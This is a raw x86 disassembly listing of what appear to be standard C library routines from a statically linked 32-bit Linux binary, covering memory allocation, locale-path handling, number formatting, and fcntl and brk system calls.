inc esi
mov edx, dword [edx + 0xc]
and eax, 0xfffffff8
add edi, eax
cmp edx, ecx
jne 0x8052e97
inc ebx
add ecx, 8
cmp ebx, 0x7f
jbe 0x8052e90
mov edx, dword [var_44h]
mov ebx, dword [arg_ch]
mov dword [var_38h], esi
mov dword [var_1ch], edi
mov ecx, dword [0x80aa7fc]
mov dword [var_34h], edx
mov eax, dword [ebx + 0x470]
mov ebx, dword [0x80aa7ec]
mov dword [var_2ch], ecx
mov edx, eax
mov dword [var_30h], ebx
mov dword [var_54h], ebx
sub edx, edi
mov ebx, dword [var_50h]
mov dword [var_3ch], eax
mov dword [var_20h], edx
mov dword [var_48h], edx
mov edx, dword [var_40h]
mov dword [var_24h], edx
mov edx, dword [ebx + 4]
mov ebx, dword [0x80aa804]
and edx, 0xfffffff8
mov dword [var_4ch], edx
mov edx, dword [arg_8h]
mov dword [edx], eax
mov dword [edx + 0x14], ebx
mov dword [edx + 4], esi
mov eax, dword [var_44h]
mov ebx, dword [var_40h]
mov dword [edx + 0x10], ecx
mov dword [edx + 8], eax
mov dword [edx + 0x18], ebx
mov eax, dword [var_54h]
mov dword [edx + 0xc], eax
mov eax, dword [var_48h]
mov dword [edx + 0x1c], eax
mov eax, edx
mov dword [edx + 0x20], edi
mov ebx, dword [var_4ch]
mov dword [edx + 0x24], ebx
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret 4
mov edx, dword [arg_ch]
mov dword [esp], edx
call fcn.08052430
mov ebx, dword [arg_ch]
mov ebx, dword [ebx + 0x54]
mov dword [var_50h], ebx
jmp 0x8052e3a
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov dword [var_8h], esi
mov edx, dword [0x80a9514]
mov ebx, dword [arg_8h]
mov edi, dword [arg_ch]
test edx, edx
je 0x805140a
mov eax, dword [arg_4h]
mov dword [esp], ebx
mov dword [var_sp_4h], edi
mov dword [var_sp_8h], eax
call edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
cmp ebx, 8
jbe 0x8051586
cmp ebx, 0xf
mov eax, 0x10
cmovbe ebx, eax
mov eax, 0
test eax, eax
je 0x805157c
mov dword [esp], 0
call section.
mov dword [var_14h], eax
mov esi, dword [var_14h]
test esi, esi
je 0x8051558
mov eax, 0
test eax, eax
je 0x805156b
mov dword [esp], esi
call section.
test eax, eax
jne 0x8051558
xor eax, eax
test esi, esi
je 0x80513ff
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.080528e0
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x805154d
mov dword [esp], esi
call section.
mov ecx, dword [var_10h]
test ecx, ecx
je 0x805149f
mov eax, dword [var_10h]
jmp 0x80513ff
cmp esi, 0x80aa360
je 0x8051502
mov eax, 0
test eax, eax
je 0x80514f6
mov dword [esp], 0x80aa360
call section.
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], ebx
mov dword [esp], 0x80aa360
call fcn.080528e0
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x80514ea
mov dword [esp], 0x80aa360
call section.
jmp 0x8051497
mov dword [0x80aa360], 0
jmp 0x8051497
mov dword [0x80aa360], 1
jmp 0x80514bc
mov edx, dword [0x80aa7cc]
mov eax, dword [var_10h]
test edx, edx
mov edx, edi
cmovne eax, esi
call fcn.0804f920
test eax, eax
mov esi, eax
je 0x8051497
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], ebx
mov dword [esp], eax
call fcn.080528e0
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x8051542
mov dword [esp], esi
jmp 0x80514e3
mov dword [esi], 0
jmp 0x8051497
mov dword [esi], 0
jmp 0x8051490
mov eax, dword [var_14h]
lea edx, [ebx + edi + 0x10]
call fcn.0804f920
mov esi, eax
jmp 0x8051462
mov eax, dword [esi]
test eax, eax
jne 0x8051558
mov dword [esi], 1
jmp 0x8051462
mov eax, dword [0x80aa34c]
jmp 0x8051437
mov dword [arg_8h], edi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp fcn.08050fe0
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_10h]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_14h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0805f400
leave
ret
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov edx, dword [arg_ch]
test edx, edx
je 0x805f6af
cmp dword [arg_1ch], 0xc
ja 0x805f79a
cmp dword [arg_1ch], 6
je 0x805f79a
mov eax, 0
test eax, eax
je 0x805f43f
mov dword [esp], 0x80a9ae0
call section.
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
test eax, eax
mov dword [esp], edx
mov eax, dword [arg_8h]
cmove eax, dword [0x80a9ac0]
mov dword [arg_8h], eax
call fcn.08053400
mov edi, dword [arg_ch]
lea ecx, [eax + 1]
add eax, 0x2b
and eax, 0xfffffffc
mov dword [var_28h], ecx
sub esp, eax
lea ebx, [var_1bh]
mov dword [var_8h], ecx
mov dword [var_4h], edi
and ebx, 0xfffffff0
lea eax, [ebx + 0x18]
mov dword [esp], eax
call fcn.08053770
mov edx, dword [arg_1ch]
mov eax, dword [arg_8h]
mov dword [ebx + 4], edx
mov dword [ebx], eax
mov dword [esp], ebx
mov dword [var_4h], 0x80aa944
mov dword [var_8h], fcn.0805f240
call fcn.0807a2c0
test eax, eax
mov dword [var_24h], eax
je 0x805f4c1
mov edx, dword [eax]
mov eax, dword [0x80aad24]
cmp dword [edx + 8], eax
je 0x805f8f1
call fcn.08048b20
mov ecx, dword [0x80aad20]
mov eax, dword [eax]
test ecx, ecx
mov dword [var_18h], ecx
mov dword [var_20h], eax
je 0x805f507
mov eax, dword [var_18h]
mov edi, dword [arg_8h]
add eax, 0x10
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x805f826
jl 0x805f81a
mov eax, dword [var_18h]
mov eax, dword [eax]
test eax, eax
mov dword [var_18h], eax
jne 0x805f4d8
mov dword [var_1ch], 0x80a01a1
mov edi, dword [arg_1ch]
mov ebx, dword [edi*4 + 0x8093ea0]
mov eax, edi
mov edx, ebx
call fcn.0805fea0
mov dword [var_3ch], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
mov dword [esp], ebx
mov dword [var_30h], eax
call fcn.08053400
mov edx, dword [var_30h]
lea eax, [edx + eax + 0x17]
and eax, 0xfffffffc
sub esp, eax
lea ecx, [var_1bh]
mov dword [var_4h], ebx
and ecx, 0xfffffff0
mov dword [esp], ecx
mov dword [var_34h], ecx
call fcn.080773c0
mov word [eax], 0x2f
mov edx, dword [arg_8h]
mov edi, dword [var_30h]
inc eax
mov dword [esp], eax
mov dword [var_8h], edi
mov dword [var_4h], edx
call fcn.08053740
mov dword [eax], 0x6f6d2e
mov ecx, dword [var_3ch]
mov dword [esp], ecx
call fcn.08053400
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea edi, [var_1bh]
and edi, 0xfffffff0
mov dword [var_38h], edi
nop
lea esi, [esi]
mov eax, dword [var_3ch]
movzx edx, byte [eax]
cmp dl, 0x3a
je 0x805f807
test dl, dl
jne 0x805f7b8
mov edi, dword [var_38h]
mov byte [edi], 0x43
mov byte [edi + 1], 0
mov edi, dword [var_38h]
cmp byte [edi], 0x43
jne 0x805f5d3
cmp byte [edi + 1], 0
je 0x805f77b
mov esi, dword [var_38h]
mov eax, 0x80a01e0
mov ecx, 6
cld
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x805f77b
mov edi, dword [var_18h]
mov ecx, dword [var_34h]
mov edx, dword [var_38h]
mov eax, dword [var_1ch]
mov dword [esp], edi
call fcn.0805ff00
sub esp, 4
mov dword [var_14h], eax
test eax, eax
je 0x805f5a0
lea eax, [var_10h]
mov ecx, dword [arg_ch]
mov edx, edi
mov dword [esp], eax
mov eax, dword [var_14h]
call fcn.0805f920
sub esp, 4
mov esi, eax
test eax, eax
jne 0x805f663
mov edx, dword [var_14h]
xor ebx, ebx
mov eax, dword [edx + 0x10]
test eax, eax
je 0x805f65b
lea ecx, [var_10h]
mov edx, dword [var_18h]
mov dword [esp], ecx
mov ecx, dword [arg_ch]
call fcn.0805f920
sub esp, 4
mov esi, eax
test eax, eax
jne 0x805f76c
mov edi, dword [var_14h]
inc ebx
mov eax, dword [edi + ebx*4 + 0x10]
test eax, eax
jne 0x805f631
test esi, esi
je 0x805f5a0
mov edx, dword [var_24h]
test edx, edx
je 0x805f6d1
mov edx, dword [var_24h]
mov ecx, dword [var_14h]
mov eax, dword [edx]
mov edx, dword [0x80aad24]
mov dword [eax + 8], edx
mov dword [eax + 0xc], ecx
mov dword [eax + 0x10], esi
mov edx, dword [var_10h]
mov dword [eax + 0x14], edx
call fcn.08048b20
mov edi, dword [var_20h]
mov dword [eax], edi
mov eax, dword [arg_14h]
test eax, eax
jne 0x805f6b7
mov eax, 0
test eax, eax
je 0x805f6ad
mov dword [esp], 0x80a9ae0
call section.
mov eax, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_10h]
mov ecx, esi
mov edx, dword [arg_18h]
mov dword [esp], eax
mov eax, dword [var_14h]
call fcn.0805fe40
sub esp, 4
mov esi, eax
jmp 0x805f698
mov edx, dword [var_28h]
mov ecx, dword [var_30h]
lea eax, [ecx + edx + 0x19]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x805f687
mov eax, dword [arg_ch]
mov edi, dword [var_28h]
mov dword [var_4h_2], eax
mov dword [var_8h_2], edi
lea eax, [ebx + 0x18]
mov dword [esp], eax
call fcn.08053740
mov edx, dword [var_30h]
mov dword [ebx], eax
mov dword [esp], eax
inc edx
mov dword [var_8h_2], edx
mov edx, dword [arg_8h]
mov dword [var_4h_2], edx
call fcn.08053770
mov dword [ebx + 0x10], esi
mov eax, dword [0x80aad24]
mov ecx, dword [arg_1ch]
mov edi, dword [var_14h]
mov dword [ebx + 8], eax
mov dword [ebx + 4], ecx
mov eax, dword [var_10h]
mov dword [ebx + 0xc], edi
mov dword [ebx + 0x14], eax
mov dword [esp], ebx
mov dword [var_4h_2], 0x80aa944
mov dword [var_8h_2], fcn.0805f240
call fcn.0807a190
test eax, eax
mov dword [var_24h], eax
je 0x805f75f
cmp dword [eax], ebx
je 0x805f687
mov dword [esp], ebx
call fcn.08051180
jmp 0x805f687
mov ecx, dword [var_14h]
mov ebx, dword [ecx + ebx*4 + 0x10]
mov dword [var_14h], ebx
jmp 0x805f65b
mov eax, 0
test eax, eax
je 0x805f790
mov dword [esp], 0x80a9ae0
call section.
call fcn.08048b20
mov edx, dword [var_20h]
mov dword [eax], edx
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
test ecx, ecx
je 0x805f6af
cmp dword [arg_18h], 1
mov eax, dword [arg_10h]
cmove eax, dword [arg_ch]
jmp 0x805f6af
cmp dl, 0x3a
mov ecx, dword [var_38h]
je 0x805f7d6
inc dword [var_3ch]
mov byte [ecx], dl
inc ecx
mov edx, dword [var_3ch]
movzx eax, byte [edx]
test al, al
mov edx, eax
je 0x805f7d6
cmp al, 0x3a
jne 0x805f7c0
mov byte [ecx], 0
mov ebx, dword [0x80a95f4]
test ebx, ebx
je 0x805f5c1
mov ecx, dword [var_38h]
mov dword [var_4h], 0x2f
mov dword [esp], ecx
call fcn.08076ce0
test eax, eax
jne 0x805f5a0
jmp 0x805f5c1
inc dword [var_3ch]
mov ecx, dword [var_3ch]
movzx edx, byte [ecx]
cmp dl, 0x3a
je 0x805f807
jmp 0x805f5af
mov dword [var_18h], 0
jmp 0x805f507
mov esi, dword [var_18h]
test esi, esi
je 0x805f507
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
cmp byte [eax], 0x2f
je 0x805f8e9
mov dword [esp], eax
mov esi, 0x1002
call fcn.08053400
inc eax
mov dword [var_2ch], eax
call fcn.08048b20
mov ebx, eax
mov ecx, dword [var_2ch]
mov dword [ebx], 0
lea eax, [ecx + esi + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea edi, [var_1bh]
mov dword [var_4h], esi
and edi, 0xfffffff0
mov dword [var_1ch], edi
mov dword [esp], edi
call fcn.08079700
test eax, eax
jne 0x805f8b9
call fcn.08048b20
mov edi, ebx
cmp dword [ebx], 0x22
jne 0x805f89a
mov eax, esi
shr eax, 1
lea esi, [eax + esi + 0x20]
jmp 0x805f858
mov eax, 0
test eax, eax
je 0x805f8af
mov dword [esp], 0x80a9ae0
call section.
mov eax, dword [var_20h]
mov dword [edi], eax
jmp 0x805f79a
mov edx, dword [var_1ch]
mov dword [var_4h], 0
mov dword [esp], edx
call fcn.080537a0
mov word [eax], 0x2f
mov ecx, dword [var_18h]
inc eax
mov edx, dword [ecx + 4]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x805f50e
mov dword [var_1ch], eax
jmp 0x805f50e
mov edi, dword [arg_14h]
test edi, edi
jne 0x805f900
mov esi, dword [edx + 0x10]
jmp 0x805f698
mov ecx, dword [edx + 0x10]
mov eax, dword [edx + 0xc]
mov edx, dword [edx + 0x14]
mov dword [esp], edx
mov edx, dword [arg_18h]
jmp 0x805f6c5
push ebp
mov ebp, esp
push edi
mov edi, str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZto_outpunct
mov eax, dword [arg_14h]
push esi
mov ecx, dword [arg_8h]
mov esi, dword [arg_10h]
push ebx
mov ebx, dword [arg_ch]
test eax, eax
mov eax, 0x80a0960
cmove edi, eax
cmp esi, 0xa
je 0x8063c75
ja 0x8063c5d
cmp esi, 8
je 0x8063c4a
lea esi, [esi]
mov eax, ecx
xor edx, edx
dec ebx
div esi
mov ecx, eax
movzx eax, byte [edx + edi]
test ecx, ecx
mov byte [ebx], al
jne 0x8063c30
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
dec ebx
and eax, 7
shr ecx, 3
movzx eax, byte [eax + edi]
mov byte [ebx], al
jne 0x8063c4a
jmp 0x8063c43
cmp esi, 0x10
jne 0x8063c30
mov eax, ecx
dec ebx
and eax, 0xf
shr ecx, 4
movzx eax, byte [eax + edi]
mov byte [ebx], al
jne 0x8063c62
jmp 0x8063c43
mov esi, 0xcccccccd
lea esi, [esi]
mov eax, ecx
dec ebx
mul esi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
movzx eax, byte [ecx + edi]
mov ecx, edx
mov byte [ebx], al
jne 0x8063c80
jmp 0x8063c43
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov eax, 0
mov esi, edx
push ebx
sub esp, 0x14
test eax, eax
mov dword [var_10h], ecx
je 0x80570e1
mov dword [var_4h], fcn.08057c50
mov dword [esp], 0x80aa860
call section.
mov eax, 0
test eax, eax
je 0x8056f96
mov dword [esp], 0x80aac88
call section.
mov eax, dword [arg_ch]
mov ecx, dword [var_10h]
mov edx, esi
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
mov eax, edi
call fcn.0805cda0
sub esp, 8
mov ebx, eax
cmp eax, 2
je 0x8056fda
mov eax, 0
test eax, eax
je 0x8056fce
mov dword [esp], 0x80aac88
call section.
mov eax, ebx
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 8
mov eax, dword [0x80aac84]
test eax, eax
jne 0x8056fff
mov eax, 0
test eax, eax
je 0x8056ff8
mov dword [esp], 0x80aac88
call section.
mov eax, 1
jmp 0x8056fd0
mov dword [esp], esi
call fcn.08056e80
mov dword [esp], edi
mov dword [var_14h], eax
call fcn.08056e80
test byte [arg_ch], 1
mov ebx, eax
jne 0x805706f
mov eax, dword [arg_8h]
mov edx, ebx
mov ecx, esi
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h_2], eax
mov eax, dword [var_14h]
mov dword [esp], eax
mov eax, edi
call fcn.080569a0
mov ebx, eax
sub esp, 0xc
mov eax, 0
test eax, eax
je 0x8057053
mov dword [esp], 0x80aac88
call section.
test ebx, ebx
mov eax, ebx
jne 0x8056fd0
mov eax, dword [var_10h]
mov ecx, dword [eax]
test ecx, ecx
sete al
movzx eax, al
jmp 0x8056fd0
mov dword [var_4h_2], esi
mov dword [esp], edi
call fcn.08076e50
test eax, eax
je 0x8056fe3
test ebx, ebx
je 0x805709b
mov dword [var_4h_2], esi
mov dword [esp], ebx
call fcn.08076e50
test eax, eax
je 0x8056fe3
mov eax, dword [var_14h]
test eax, eax
je 0x805701a
mov eax, dword [var_14h]
mov dword [esp], edi
mov dword [var_4h_2], eax
call fcn.08076e50
test eax, eax
je 0x8056fe3
test ebx, ebx
je 0x805701a
mov eax, dword [var_14h]
mov dword [esp], ebx
mov dword [var_4h_2], eax
call fcn.08076e50
test eax, eax
jne 0x805701a
jmp 0x8056fe3
mov eax, dword [0x80aa860]
test eax, eax
jne 0x8056f81
call fcn.08057c50
mov dword [0x80aa860], 2
jmp 0x8056f81
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov dword [var_14h], edx
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x8057134
mov dword [esp], 0x80aac88
call section.
mov edi, dword [var_14h]
mov eax, dword [var_14h]
dec edi
test eax, eax
je 0x8057161
mov eax, edi
mov edx, dword [var_10h]
shl eax, 4
sub eax, edi
lea esi, [edx + eax*4]
lea esi, [esi]
mov ebx, edi
mov eax, esi
dec edi
call fcn.08056690
sub esi, 0x3c
test ebx, ebx
jne 0x8057150
mov eax, dword [var_10h]
mov edx, dword [var_14h]
call fcn.0805d140
mov eax, 0
test eax, eax
je 0x8057181
mov dword [esp], 0x80aac88
call section.
add esp, 0xc
xor eax, eax
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
lea ecx, [var_4h]
mov dword [esp], ecx
mov dword [var_sp_4h], 0
lea ecx, [var_8h]
call fcn.08056f50
xor edx, edx
sub esp, 8
test eax, eax
jne 0x8053a3b
mov edx, dword [var_4h]
cmp edx, 1
ja 0x8053a40
mov eax, dword [arg_10h]
mov dword [eax], edx
mov edx, dword [var_8h]
mov eax, edx
leave
ret
nop
mov eax, dword [var_8h]
call fcn.08057110
mov dword [var_8h], 0
jmp 0x8053a38
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x8053a81
mov dword [esp], 0x80aacb0
call section.
mov eax, dword [var_10h]
mov ecx, dword [eax + 0x14]
test ecx, ecx
jne 0x8053bc2
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov dword [var_18h], eax
je 0x8053bb8
mov edx, dword [var_10h]
mov ecx, dword [var_10h]
mov eax, 0x80a4f11
xor edi, edi
mov edx, dword [edx + 0x5c]
mov ecx, dword [ecx + 0x1c]
mov dword [var_14h], edx
mov ebx, edx
test ecx, ecx
mov edx, 0x8092de3
mov dword [var_1ch], ecx
cmove edx, eax
mov dword [esp], edx
call fcn.08053400
mov dword [var_20h], eax
movzx ecx, byte [ebx]
test cl, cl
je 0x8053af1
mov edx, ecx
nop
inc ebx
lea eax, [edi + 1]
cmp dl, 0x2f
movzx edx, byte [ebx]
cmove edi, eax
test dl, dl
jne 0x8053ae0
sub ebx, dword [var_14h]
mov edx, dword [var_20h]
lea eax, [edx + ebx + 0x15]
mov ebx, dword [var_14h]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
test cl, cl
mov dword [var_24h], eax
mov esi, eax
je 0x8053b30
movzx edx, byte [ebx]
mov eax, dword [0x80a99fc]
movsx edx, dl
mov ecx, esi
inc ebx
inc esi
mov eax, dword [eax + edx*4]
mov byte [ecx], al
movzx eax, byte [ebx]
test al, al
mov edx, eax
jne 0x8053b16
cmp edi, 1
ja 0x8053b70
mov byte [esi], 0x2f
inc esi
test edi, edi
jne 0x8053b70
mov byte [esi], 0x2f
mov edx, dword [var_20h]
inc esi
test edx, edx
je 0x8053b70
mov edx, dword [var_20h]
mov eax, dword [var_1ch]
mov dword [esp], esi
test eax, eax
mov dword [var_8h], edx
mov eax, 0x80a4f11
mov edx, 0x8092de3
cmove edx, eax
mov dword [var_4h], edx
call fcn.08053740
mov esi, eax
nop
mov byte [esi], 0
mov dword [esp], 0x8093633
mov ecx, dword [var_24h]
mov eax, dword [var_18h]
mov dword [var_4h], ecx
add eax, 4
mov dword [var_8h], eax
call fcn.08053a00
mov edx, dword [var_18h]
mov dword [edx], eax
xor edx, edx
test eax, eax
jne 0x8053bfb
mov eax, dword [var_18h]
test edx, edx
mov dword [eax + 8], edx
jne 0x8053be9
mov edx, eax
mov eax, dword [eax]
test eax, eax
jne 0x8053bdf
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [var_10h]
mov dword [edx + 0x14], 0x8092dec
mov eax, 0
test eax, eax
je 0x8053bd7
mov dword [esp], 0x80aacb0
call section.
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [edx + 4]
call fcn.08057110
jmp 0x8053bad
mov ecx, dword [var_10h]
mov eax, dword [var_18h]
mov dword [ecx + 0x10], 0x8053d30
mov dword [ecx + 0x14], eax
jmp 0x8053bc2
mov eax, dword [var_18h]
mov ecx, dword [var_24h]
mov dword [var_4h], 0x8093633
add eax, 0xc
mov dword [esp], ecx
mov dword [var_8h], eax
call fcn.08053a00
mov edx, eax
jmp 0x8053b9b
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
cmp eax, 1
je 0x8054447
cmp eax, 3
je 0x805445c
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [esp]
leave
ret
movzx eax, word [ebx]
mov dword [ecx + 4], 0
mov dword [ecx + 8], 0
mov dword [ecx + 0x5c], 0
mov dword [ecx + 0x24], 0
mov dword [ecx + 0x28], 0
mov dword [ecx + 0x30], 0
mov dword [ecx + 0x3c], 0
mov dword [ecx], eax
mov eax, dword [ebx + 4]
mov dword [ecx + 0xc], eax
mov dword [ecx + 0x58], eax
movzx eax, word [ebx + 8]
mov dword [ecx + 0x10], eax
movzx eax, word [ebx + 0xa]
mov dword [ecx + 0x14], eax
movzx eax, word [ebx + 0xc]
mov dword [ecx + 0x18], eax
movzx eax, word [ebx + 0xe]
mov dword [ecx + 0x1c], eax
movzx eax, word [ebx + 0x10]
mov dword [ecx + 0x20], eax
mov eax, dword [ebx + 0x14]
mov dword [ecx + 0x2c], eax
mov eax, dword [ebx + 0x18]
mov dword [ecx + 0x34], eax
mov eax, dword [ebx + 0x1c]
mov dword [ecx + 0x38], eax
mov eax, dword [ebx + 0x20]
mov dword [ecx + 0x40], eax
mov eax, dword [ebx + 0x24]
mov dword [ecx + 0x44], eax
mov eax, dword [ebx + 0x28]
mov dword [ecx + 0x48], eax
mov eax, dword [ebx + 0x2c]
mov dword [ecx + 0x4c], eax
mov eax, dword [ebx + 0x30]
mov dword [ecx + 0x50], eax
mov eax, dword [ebx + 0x34]
mov dword [ecx + 0x54], eax
xor eax, eax
jmp 0x8054457
push ebp
mov ebp, esp
sub esp, 0x40
mov edx, dword [0x80aabf0]
mov eax, dword [arg_10h]
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_ch]
test edx, edx
mov dword [var_30h], eax
jne 0x80540a2
mov ebx, dword [arg_8h]
mov ecx, edi
mov edx, eax
mov eax, 0xdd
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x805422e
test esi, esi
js 0x805408e
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
call fcn.08048b20
cmp dword [eax], 0x26
jne 0x8054081
mov dword [0x80aabf0], 1
cmp edi, 0xc
je 0x805416b
jl 0x805415a
cmp edi, 0xe
jg 0x805415a
mov ebx, dword [var_30h]
mov esi, dword [var_30h]
mov eax, dword [ebx + 4]
mov edx, dword [esi + 8]
mov ecx, eax
mov ebx, eax
mov dword [var_28h], eax
mov eax, dword [esi + 4]
sar ebx, 0x1f
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
mov eax, dword [edx + 0xc]
mov ecx, eax
mov ebx, eax
mov dword [var_24h], eax
mov eax, dword [edx + 0xc]
sar ebx, 0x1f
mov edx, dword [edx + 0x10]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
lea ecx, [edi - 7]
mov ebx, dword [arg_8h]
movzx eax, word [edx]
mov word [var_2ch], ax
movzx eax, word [edx + 2]
mov word [var_2ah], ax
mov eax, dword [edx + 0x14]
lea edx, [var_2ch]
mov dword [var_20h], eax
mov eax, 0x37
int 0x80
cmp eax, 0xfffff000
mov esi, eax
jbe 0x8054081
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x8054081
call fcn.08048b20
mov dword [eax], 0x4b
mov eax, 0xffffffff
jmp 0x8054083
mov ebx, dword [arg_8h]
mov ecx, edi
mov edx, dword [var_30h]
mov eax, 0x37
int 0x80
jmp 0x8054125
mov esi, dword [var_30h]
mov eax, dword [esi + 4]
mov edx, dword [esi + 8]
mov ecx, eax
mov ebx, eax
mov dword [var_18h], eax
mov eax, dword [esi + 4]
sar ebx, 0x1f
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
mov eax, dword [edx + 0xc]
mov ecx, eax
mov ebx, eax
mov dword [var_14h], eax
mov eax, dword [edx + 0xc]
sar ebx, 0x1f
mov edx, dword [edx + 0x10]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
mov ecx, 5
mov ebx, dword [arg_8h]
movzx eax, word [edx]
mov word [var_1ch], ax
movzx eax, word [edx + 2]
mov word [var_1ah], ax
mov eax, dword [edx + 0x14]
lea edx, [var_1ch]
mov dword [var_10h], eax
mov eax, 0x37
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x805421e
test esi, esi
mov eax, esi
jne 0x8054083
mov esi, dword [var_30h]
mov eax, dword [var_1ch]
mov word [esi], ax
movzx eax, word [var_1ah]
mov word [esi + 2], ax
mov eax, dword [var_18h]
cdq
mov dword [esi + 4], eax
mov eax, dword [var_14h]
mov dword [esi + 8], edx
mov ecx, eax
mov dword [esi + 0xc], eax
mov eax, dword [var_10h]
sar ecx, 0x1f
mov dword [esi + 0x10], ecx
mov dword [esi + 0x14], eax
xor eax, eax
jmp 0x8054083
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x80541de
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x805407d
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, 0x2d
int 0x80
xor edx, edx
cmp eax, ebx
mov dword [0x80aa9dc], eax
jb 0x807a000
mov ebx, dword [esp]
mov eax, edx
leave
ret
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0xc
jmp 0x8079ff9
push edi
push esi
xor eax, eax
mov esi, dword [arg_ch]
mov ecx, dword [arg_10h]
mov ch, cl
mov edx, ecx
shl ecx, 0x10
mov cx, dx
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x807708a
mov eax, esi
or dl, dl
je 0x8077216
inc esi
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x80770a3
mov eax, esi
or dl, dl
je 0x8077216
inc esi
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x80770bc
mov eax, esi
or dl, dl
je 0x8077216
inc esi
jmp 0x8077103
add byte [eax], al
add byte [ebx - 0x117cfb12], al
sub esi, 4
sub esi, 4
sub esi, 4
test edx, 0xff000000
jne 0x80770e9
lea eax, [esi + 0xf]
jmp 0x8077100
sub esi, 4
sub esi, 4
sub esi, 4
test edx, 0xff0000
jne 0x80770f6
lea eax, [esi + 0xe]
jmp 0x8077100
lea eax, [esi + 0xc]
test dh, dh
jne 0x8077100
lea eax, [esi + 0xd]
add esi, 0x10
mov edx, dword [esi]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771ec
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771ec
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770ca
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e0
mov edx, dword [esi + 4]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e9
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e9
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770cd
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e3
mov edx, dword [esi + 8]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e6
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e6
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770d0
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e6
mov edx, dword [esi + 0xc]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e3
xor edi, edx
or edi, 0xfefefeff
